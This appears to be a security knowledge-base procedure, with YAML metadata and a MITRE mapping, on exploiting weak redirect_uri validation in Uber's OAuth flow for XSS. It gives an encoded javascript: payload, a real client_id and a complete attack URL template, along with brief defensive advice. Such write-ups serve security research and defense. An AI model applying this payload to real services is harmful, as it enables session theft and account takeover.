---
tags:
  - xss
  - javascript-uri
  - oauth
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-oauth-access]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:07.912Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: af6b68ca-5823-4c61-adce-039b4a7c78a3
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-Redirect-URI-for-XSS

## Summary

This procedure constructs a malicious redirect_uri parameter using the javascript: protocol to inject arbitrary JavaScript into Uber's OAuth flow, exploiting weak validation that only checks for '://' presence without protocol restrictions.

## Description

The OAuth authorize endpoint at https://login.uber.com/oauth/authorize validates the redirect_uri by ensuring it contains '://' but does not restrict the scheme, allowing javascript: URIs. This enables XSS in the context of uber.com when the redirect is triggered, particularly effective in browsers like Opera Mini or Firefox with certain settings. The payload executes post-authorization, potentially leading to session theft or account takeover.

## Requirements

1. Access to a web browser vulnerable to javascript: execution in redirects
2. Knowledge of Uber's OAuth client_id (e.g., MXeE1dl-5R3yTCbufMHsfz3KhfY2UGyS from public reports)
3. URL encoding tools for payload construction

## Defense

Defensive measures and detection strategies:

- Implement strict protocol whitelisting (e.g., only http/https) for redirect_uris
- Use Content-Security-Policy (CSP) to block inline JavaScript execution
- Monitor for anomalous redirect patterns in OAuth logs
- Validate domain ownership for registered redirect_uris

## Objectives

1. Create a functional javascript: URI payload for XSS
2. Ensure compatibility with affected browser configurations
3. Prepare for chaining with authorization flow

## Instructions

### Step 1: Encode JavaScript Payload

**Context**: Build the payload to execute on redirect, such as alerting the domain to confirm context.

**Command** ([[commands/curl-oauth-access]]):
```bash
# No direct command; manually construct or use URL encoder
# Payload: alert(document.domain);
# Encoded: %2F%2Fgoog.com%2F%250Aalert%28document.domain%29%3B%2F%2F
```

> Manually encode the JS using an online tool or script. Expected: Properly URL-encoded string without breaking the URI.

### Step 2: Assemble Full OAuth URL

**Context**: Integrate the encoded URI into the redirect_uri parameter with valid OAuth params.

Use this template:

```url
https://login.uber.com/oauth/authorize?client_id=MXeE1dl-5R3yTCbufMHsfz3KhfY2UGyS&response_type=code&scope=profile&redirect_uri=javascript:[ENCODED_PAYLOAD]
```

> Replace [ENCODED_PAYLOAD] with the result from Step 1. Expected: Complete URL ready for access.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-oauth-access]]

## Tools Used


## Tags

- xss
- oauth
- javascript-uri
